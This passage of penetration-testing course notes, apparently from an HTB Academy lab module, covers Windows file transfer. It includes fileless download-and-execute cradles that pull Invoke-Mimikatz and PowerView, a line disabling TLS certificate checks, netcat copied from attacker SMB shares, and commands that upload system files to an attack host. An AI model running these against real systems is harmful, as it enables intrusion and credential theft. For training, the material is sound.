demonstrated in the module sections as possible. Observe the nuances between the different transfer methods and note down situations where they would be helpful. Once you have completed this module, try out the various techniques in other HTB Academy modules and boxes and labs on the HTB main platform.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/06-File Transfers/03-Windows File Transfer Methods",
    "path": "02_CPTS/06-File Transfers/03-Windows File Transfer Methods.md",
    "title": "03 Windows File Transfer Methods",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Introduction The Windows operating system has evolved over the past few years, and new versions come with different utilities for file transfer operations. Understanding file transfer in Windows can h...",
    "category": "02_CPTS",
    "content": "## Introduction\n\nThe Windows operating system has evolved over the past few years, and new versions come with different utilities for file transfer operations. Understanding file transfer in Windows can help both attackers and defenders. Attackers can use various file transfer methods to operate and avoid being caught. Defenders can learn how these methods work to monitor and create the corresponding policies to avoid being compromised. Let's use the [Microsoft Astaroth Attack](https://www.microsoft.com/en-us/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/) blog post as an example of an advanced persistent threat (APT).\n\nThe blog post starts out talking about [fileless threats](https://www.microsoft.com/en-us/security/blog/2018/01/24/now-you-see-me-exposing-fileless-malware/). The term `fileless` suggests that a threat doesn't come in a file, they use legitimate tools built into a system to execute an attack. This doesn't mean that there's not a file transfer operation. As discussed later in this section, the file is not \"present\" on the system but runs in memory.\n\nThe `Astaroth attack` generally followed these steps: A malicious link in a spear-phishing email led to an LNK file. When double-clicked, the LNK file caused the execution of the [WMIC tool](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic) with the \"/Format\" parameter, which allowed the download and execution of malicious JavaScript code. The JavaScript code, in turn, downloads payloads by abusing the [Bitsadmin tool](https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool).\n\nAll the payloads were base64-encoded and decoded using the Certutil tool resulting in a few DLL files. The [regsvr32](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32) tool was then used to load one of the decoded DLLs, which decrypted and loaded other files until the final payload, Astaroth, was injected into the `Userinit` process. Below is a graphical depiction of the attack.\n\n![Flowchart of a spear-phishing attack using WMIC, Bitsadmin, Certutil, and Regsvr32 to execute and inject malicious DLLs.](https://academy.hackthebox.com/storage/modules/24/fig1a-astaroth-attack-chain.png)\n\n[Image source](https://www.microsoft.com/security/blog/wp-content/uploads/2019/08/fig1a-astaroth-attack-chain.png)\n\nThis is an excellent example of multiple methods for file transfer and the threat actor using those methods to bypass defenses.\n\nThis section will discuss using some native Windows tools for download and upload operations. Later in the module, we'll discuss `Living Off The Land` binaries on Windows & Linux and how to use them to perform file transfer operations.\n\n---\n\n## Download Operations\n\nWe have access to the machine `MS02`, and we need to download a file from our `Pwnbox` machine. Let's see how we can accomplish this using multiple File Download methods.\n\n![Network diagram showing a Windows PC, Layer 2 switch, firewall, cloud, and Linux PC.](https://academy.hackthebox.com/storage/modules/24/WIN-download-PwnBox.png)\n\n## PowerShell Base64 Encode & Decode\n\nDepending on the file size we want to transfer, we can use different methods that do not require network communication. If we have access to a terminal, we can encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation, decoding the file in the original content. Let's see how we can do this with PowerShell.\n\nAn essential step in using this method is to ensure the file you encode and decode is correct. We can use [md5sum](https://man7.org/linux/man-pages/man1/md5sum.1.html), a program that calculates and verifies 128-bit MD5 checksums. The MD5 hash functions as a compact digital fingerprint of a file, meaning a file should have the same MD5 hash everywhere. Let's attempt to transfer a sample ssh key. It can be anything else, from our Pwnbox to the Windows target.\n\n#### Pwnbox Check SSH Key MD5 Hash\n\nWindows File Transfer Methods\n\n```shell-session\ndrxh3kr@htb[/htb]$ md5sum id_rsa\n\n4e301756a07ded0a2dd6953abf015278  id_rsa\n```\n\n#### Pwnbox Encode SSH Key to Base64\n\nWindows File Transfer Methods\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat id_rsa |base64 -w 0;echo\n\nLS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=\n```\n\nWe can copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.\n\nWindows File Transfer Methods\n\n```powershell-session\nPS C:\\htb> [IO.File]::WriteAllBytes(\"C:\\Users\\Public\\id_rsa\", [Convert]::FromBase64String(\"LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=\"))\n```\n\nFinally, we can confirm if the file was transferred successfully using the [Get-FileHash](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2) cmdlet, which does the same thing that `md5sum` does.\n\n#### Confirming the MD5 Hashes Match\n\nWindows File Transfer Methods\n\n```powershell-session\nPS C:\\htb> Get-FileHash C:\\Users\\Public\\id_rsa -Algorithm md5\n\nAlgorithm       Hash                                                                   Path\n---------       ----                                                                   ----\nMD5             4E301756A07DED0A2DD6953ABF015278                                       C:\\Users\\Public\\id_rsa\n```\n\n**Note:** While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.\n\n---\n\n## PowerShell Web Downloads\n\nMost companies allow `HTTP` and `HTTPS` outbound traffic through the firewall to allow employee productivity. Leveraging these transportation methods for file transfer operations is very convenient. Still, defenders can use Web filtering solutions to prevent access to specific website categories, block the download of file types (like .exe), or only allow access to a list of whitelisted domains in more restricted networks.\n\nPowerShell offers many file transfer options. In any version of PowerShell, the [System.Net.WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) class can be used to download a file over `HTTP`, `HTTPS` or `FTP`. The following [table](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0) describes WebClient methods for downloading data from a resource:\n\n|**Method**|**Description**|\n|---|---|\n|[OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)|Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0).|\n|[OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)|Returns the data from a resource without blocking the calling thread.|\n|[DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)|Downloads data from a resource and returns a Byte array.|\n|[DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)|Downloads data from a resource and returns a Byte array without blocking the calling thread.|\n|[DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)|Downloads data from a resource to a local file.|\n|[DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)|Downloads data from a resource to a local file without blocking the calling thread.|\n|[DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)|Downloads a String from a resource and returns a String.|\n|[DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0)|Downloads a String from a resource without blocking the calling thread.|\n\nLet's explore some examples of those methods for downloading files using PowerShell.\n\n#### PowerShell DownloadFile Method\n\nWe can specify the class name `Net.WebClient` and the method `DownloadFile` with the parameters corresponding to the URL of the target file to download and the output file name.\n\n#### File Download\n\nWindows File Transfer Methods\n\n```powershell-session\nPS C:\\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')\nPS C:\\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1')\n\nPS C:\\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')\nPS C:\\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\\Users\\Public\\Downloads\\PowerViewAsync.ps1')\n```\n\n#### PowerShell DownloadString - Fileless Method\n\nAs we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`.\n\nWindows File Transfer Methods\n\n```powershell-session\nPS C:\\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')\n```\n\n`IEX` also accepts pipeline input.\n\nWindows File Transfer Methods\n\n```powershell-session\nPS C:\\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX\n```\n\n#### PowerShell Invoke-WebRequest\n\nFrom PowerShell 3.0 onwards, the [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name.\n\nWindows File Transfer Methods\n\n```powershell-session\nPS C:\\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1\n```\n\nHarmj0y has compiled an extensive list of PowerShell download cradles [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239). It is worth gaining familiarity with them and their nuances, such as a lack of proxy awareness or touching disk (downloading a file onto the target) to select the appropriate one for the situation.\n\n#### Common Errors with PowerShell\n\nThere may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.\n\n![Internet Explorer 11 setup screen with options to use recommended security settings or not.](https://academy.hackthebox.com/storage/modules/24/IE_settings.png)\n\nThis can be bypassed using the parameter `-UseBasicParsing`.\n\nWindows File Transfer Methods\n\n```powershell-session\nPS C:\\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX\n\nInvoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.\nAt line:1 char:1\n+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException\n+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand\n\nPS C:\\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX\n```\n\nAnother error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:\n\nWindows File Transfer Methods\n\n```powershell-session\nPS C:\\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')\n\nException calling \"DownloadString\" with \"1\" argument(s): \"The underlying connection was closed: Could not establish trust\nrelationship for the SSL/TLS secure channel.\"\nAt line:1 char:1\n+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : WebException\nPS C:\\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n```\n\n---\n\n## SMB Downloads\n\nThe Server Message Block protocol (SMB protocol) that runs on port TCP/445 is common in enterprise networks where Windows services are running. It enables applications and users to transfer files to and from remote servers.\n\nWe can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) from Impacket and then use `copy`, `move`, PowerShell `Copy-Item`, or any other tool that allows connection to SMB.\n\n#### Create the SMB Server\n\nWindows File Transfer Methods\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n```\n\nTo download a file from the SMB server to the current working directory, we can use the following command:\n\n#### Copy a File from the SMB Server\n\nWindows File Transfer Methods\n\n```cmd-session\nC:\\htb> copy \\\\192.168.220.133\\share\\nc.exe\n\n        1 file(s) copied.\n```\n\nNew versions of Windows block unauthenticated guest access, as we can see in the following command:\n\nWindows File Transfer Methods\n\n```cmd-session\nC:\\htb> copy \\\\192.168.220.133\\share\\nc.exe\n\nYou can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.\n```\n\nTo transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server on our windows target machine:\n\n#### Create the SMB Server with a Username and Password\n\nWindows File Transfer Methods\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n```\n\n#### Mount the SMB Server with Username and Password\n\nWindows File Transfer Methods\n\n```cmd-session\nC:\\htb> net use n: \\\\192.168.220.133\\share /user:test test\n\nThe command completed successfully.\n\nC:\\htb> copy n:\\nc.exe\n        1 file(s) copied.\n```\n\n**Note:** You can also mount the SMB server if you receive an error when you use `copy filename \\\\IP\\sharename`.\n\n---\n\n## FTP Downloads\n\nAnother way to transfer files is using FTP (File Transfer Protocol), which use port TCP/21 and TCP/20. We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server.\n\nWe can configure an FTP Server in our attack host using Python3 `pyftpdlib` module. It can be installed with the following command:\n\n#### Installing the FTP Server Python3 Module - pyftpdlib\n\nWindows File Transfer Methods\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo pip3 install pyftpdlib\n```\n\nThen we can specify port number 21 because, by default, `pyftpdlib` uses port 2121. Anonymous authentication is enabled by default if we don't set a user and password.\n\n#### Setting up a Python3 FTP Server\n\nWindows File Transfer Methods\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo python3 -m pyftpdlib --port 21\n\n[I 2022-05-17 10:09:19] concurrency model: async\n[I 2022-05-17 10:09:19] masquerade (NAT) address: None\n[I 2022-05-17 10:09:19] passive ports: None\n[I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<\n```\n\nAfter the FTP server is set up, we can perform file transfers using the pre-installed FTP client from Windows or PowerShell `Net.WebClient`.\n\n#### Transferring Files from an FTP Server Using PowerShell\n\nWindows File Transfer Methods\n\n```powershell-session\nPS C:\\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\\Users\\Public\\ftp-file.txt')\n```\n\nWhen we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.\n\n#### Create a Command File for the FTP Client and Download the Target File\n\nWindows File Transfer Methods\n\n```cmd-session\nC:\\htb> echo open 192.168.49.128 > ftpcommand.txt\nC:\\htb> echo USER anonymous >> ftpcommand.txt\nC:\\htb> echo binary >> ftpcommand.txt\nC:\\htb> echo GET file.txt >> ftpcommand.txt\nC:\\htb> echo bye >> ftpcommand.txt\nC:\\htb> ftp -v -n -s:ftpcommand.txt\nftp> open 192.168.49.128\nLog in with USER and PASS first.\nftp> USER anonymous\n\nftp> GET file.txt\nftp> bye\n\nC:\\htb>more file.txt\nThis is a test file\n```\n\n---\n\n## Upload Operations\n\nThere are also situations such as password cracking, analysis, exfiltration, etc., where we must upload files from our target machine into our attack host. We can use the same methods we used for download operation but now for uploads. Let's see how we can accomplish uploading files in various ways.\n\n---\n\n## PowerShell Base64 Encode & Decode\n\nWe saw how to decode a base64 string using Powershell. Now, let's do the reverse operation and encode a file so we can decode it on our attack host.\n\n#### Encode File Using PowerShell\n\nWindows File Transfer Methods\n\n```powershell-session\nPS C:\\htb> [Convert]::ToBase64String((Get-Content -path \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Encoding byte))\n\nIyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=\nPS C:\\htb> Get-FileHash \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Algorithm MD5 | select Hash\n\nHash\n----\n3688374325B992DEF12793500307566D\n```\n\nWe copy this content and paste it into our attack host, use the `base64` command to decode it, and use the `md5sum` application to confirm the transfer happened correctly.\n\n#### Decode Base64 String in Linux\n\nWindows File Transfer Methods\n\n```shell-session\ndrxh3kr@htb[/htb]$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts\n```\n\nWindows File Transfer Methods\n\n```shell-session\ndrxh3kr@htb[/htb]$ md5sum hosts \n\n3688374325b992def12793500307566d  hosts\n```\n\n---\n\n## PowerShell Web Uploads\n\nPowerShell doesn't have a built-in function for upload operations, but we can use `Invoke-WebRequest` or `Invoke-RestMethod` to build our upload function. We'll also need a web server that accepts uploads, which is not a default option in most common webserver utilities.\n\nFor our web server, we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python [HTTP.server module](https://docs.python.org/3/library/http.server.html), which includes a file upload page. Let's install it and start the webserver.\n\n#### Installing a Configured WebServer with Upload\n\nWindows File Transfer Methods\n\n```shell-session\ndrxh3kr@htb[/htb]$ pip3 install uploadserver\n\nCollecting upload server\n  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)\nInstalling collected packages: uploadserver\nSuccessfully installed uploadserver-2.0.1\n```\n\nWindows File Transfer Methods\n\n```shell-session\ndrxh3kr@htb[/htb]$ python3 -m uploadserver\n\nFile upload available at /upload\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n```\n\nNow we can use a PowerShell script [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses `Invoke-RestMethod` to perform the upload operations. The script accepts two parameters `-File`, which we use to specify the file path, and `-Uri`, the server URL where we'll upload our file. Let's attempt to upload the host file from our Windows host.\n\n#### PowerShell Script to Upload a File to Python Upload Server\n\nWindows File Transfer Methods\n\n```powershell-session\nPS C:\\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')\nPS C:\\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts\n\n[+] File Uploaded:  C:\\Windows\\System32\\drivers\\etc\\hosts\n[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373\n```\n\n### PowerShell Base64 Web Upload\n\nAnother way to use PowerShell and base64 encoded files for upload operations is by using `Invoke-WebRequest` or `Invoke-RestMethod` together with Netcat. We use Netcat to listen in on a port we specify and send the file as a `POST` request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.\n\nWindows File Transfer Methods\n\n```powershell-session\nPS C:\\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte))\nPS C:\\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64\n```\n\nWe catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.\n\nWindows File Transfer Methods\n\n```shell-session\ndrxh3kr@htb[/htb]$ nc -lvnp 8000\n\nlistening on [any] 8000 ...\nconnect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923\nPOST / HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682\nContent-Type: application/x-www-form-urlencoded\nHost: 192.168.49.128:8000\nContent-Length: 